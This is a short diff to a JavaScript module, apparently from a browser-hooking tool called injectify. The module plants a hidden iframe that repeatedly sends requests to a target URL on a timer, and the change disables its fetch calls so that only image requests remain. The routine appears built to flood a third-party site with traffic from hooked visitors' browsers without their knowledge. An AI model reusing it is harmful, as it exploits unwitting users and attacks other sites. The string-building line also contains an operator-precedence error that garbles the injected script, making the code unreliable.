@@ -100,7 +100,7 @@ if (injectify.info.platform === 'browser') {
                 interaction: false,
                 hidden: true
             }, function(element) {
-                element.srcdoc = '<script>setInterval(function(){ var url=' + JSON.stringify(target) + request.random ? '+"?"++new Date()' : '' + '; var req = new Image(); req.src=url; if (typeof window.fetch === "function") window.fetch(url); },' + request.interval + ')</script>'
+                element.srcdoc = '<script>setInterval(function(){ var url=' + JSON.stringify(target) + request.random ? '+"?"++new Date()' : '' + '; var req = new Image(); req.src=url; /* if (typeof window.fetch === "function") window.fetch(url); */ },' + request.interval + ')</script>'
             })
 
             /**
@@ -115,9 +115,9 @@ if (injectify.info.platform === 'browser') {
                 /**
                  * Make a request
                  */
-                if (typeof window.fetch === 'function') {
-                    window.fetch(url)
-                }
+                // if (typeof window.fetch === 'function') {
+                //     window.fetch(url)
+                // }
                 var req = new Image()
                 req.src = url
                 req.onload
